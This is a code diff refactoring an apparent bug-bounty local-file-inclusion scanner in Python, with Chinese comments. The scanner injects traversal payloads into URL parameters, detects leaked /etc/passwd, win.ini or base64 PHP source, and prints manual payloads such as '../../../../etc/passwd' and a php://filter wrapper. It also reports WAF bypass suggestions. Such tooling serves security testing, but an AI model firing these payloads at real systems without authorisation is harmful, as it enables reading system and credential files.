@@ -3,10 +3,8 @@
 from typing import Optional
 
 from ..client import HttpClient
-from ..data.waf import waf_precheck
 from ..data import LFI_PAYLOADS
-from ..utils import normalize_url
-from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
+from ..utils import normalize_url, extract_params_from_url, build_url_with_param, run_waf_precheck
 
 
 async def bb_lfi(
@@ -41,21 +39,13 @@ async def bb_lfi(
     results.append("")
 
     client = HttpClient(timeout=timeout, proxy=proxy, cookie=cookie, auth_token=auth_token)
-    # WAF 预检
-    if waf_mode != "off":
-        _w = await waf_precheck(url, waf_mode=waf_mode, request_delay=request_delay, proxy=proxy, cookie=cookie, auth_token=auth_token)
-        if _w["waf_detected"]:
-            _wn = _w.get("waf_name","")
-    _wd = _w.get("delay",0)
-    results.append(f"[!] WAF 检测: " + _wn + " 自动降速至 " + str(_wd) + "s")
-    for s in _w["suggestions"]:
-        results.append(f"    绕过: " + s)
 
+    # WAF 预检（使用公共函数）
+    waf_lines = await run_waf_precheck(url, waf_mode=waf_mode, request_delay=request_delay,
+                                       proxy=proxy, cookie=cookie, auth_token=auth_token)
+    results.extend(waf_lines)
 
-    test_params = [p.strip() for p in params.split(",") if p.strip()]
-    if not test_params:
-        parsed = urlparse(url)
-        test_params = list(parse_qs(parsed.query).keys())
+    test_params = extract_params_from_url(url, params)
 
     if not test_params:
         results.append("[!] 未找到参数，请提供含文件参数的 URL")
@@ -65,8 +55,8 @@ async def bb_lfi(
     try:
         base_resp = await client.get(url)
         base_len = len(base_resp.content)
-        _as = "required" if base_resp.status_code in (401,403) else "none"
-        results.append(f"[AUTH: {_as}] HTTP {base_resp.status_code}")
+        auth_status = "required" if base_resp.status_code in (401, 403) else "none"
+        results.append(f"[AUTH: {auth_status}] HTTP {base_resp.status_code}")
     except Exception:
         base_len = 0
 
@@ -75,30 +65,26 @@ async def bb_lfi(
     for param in test_params:
         for payload in LFI_PAYLOADS:
             try:
-                parsed = urlparse(url)
-                qs = parse_qs(parsed.query, keep_blank_values=True)
-                qs[param] = [payload]
-                new_qs = urlencode(qs, doseq=True)
-                new_url = urlunparse(parsed._replace(query=new_qs))
+                new_url = build_url_with_param(url, param, payload)
                 if method.upper() == "POST":
                     resp = await client.post(url, data=body or {param: payload})
                 else:
                     resp = await client.get(new_url)
-                body = resp.text
+                resp_body = resp.text
 
                 indicators = []
                 # Linux 文件读取成功
-                if "root:" in body and ":" in body[:200]:
+                if "root:" in resp_body and ":" in resp_body[:200]:
                     indicators.append("/etc/passwd 读取成功")
                 # Windows 文件读取
-                if "[fonts]" in body or "for 16-bit" in body:
+                if "[fonts]" in resp_body or "for 16-bit" in resp_body:
                     indicators.append("win.ini 读取成功")
                 # Base64 PHP filter
-                if "PD9" in body or "base64" in body.lower():
+                if "PD9" in resp_body or "base64" in resp_body.lower():
                     indicators.append("PHP filter 返回了 Base64 编码")
                 # 响应大小变化
                 if base_len and abs(len(resp.content) - base_len) > 500:
-                    indicators.append(f"响应大小变化 ({base_len} → {len(resp.content)})")
+                    indicators.append(f"响应大小变化 ({base_len} -> {len(resp.content)})")
 
                 if indicators:
                     findings.append({
@@ -114,9 +100,9 @@ async def bb_lfi(
         results.append("[-] 未检测到 LFI 路径遍历")
         results.append("")
         results.append("[*] 手动尝试:")
-        results.append("  🔹 ../../../../etc/passwd")
-        results.append("  🔹 ....//....//....//....//etc/passwd")
-        results.append("  🔹 使用 PHP wrapper: php://filter/convert.base64-encode/resource=index.php")
+        results.append("  - ../../../../etc/passwd")
+        results.append("  - ....//....//....//....//etc/passwd")
+        results.append("  - 使用 PHP wrapper: php://filter/convert.base64-encode/resource=index.php")
     else:
         results.append(f"[!] 发现 {len(findings)} 个 LFI 路径:")
         results.append("")
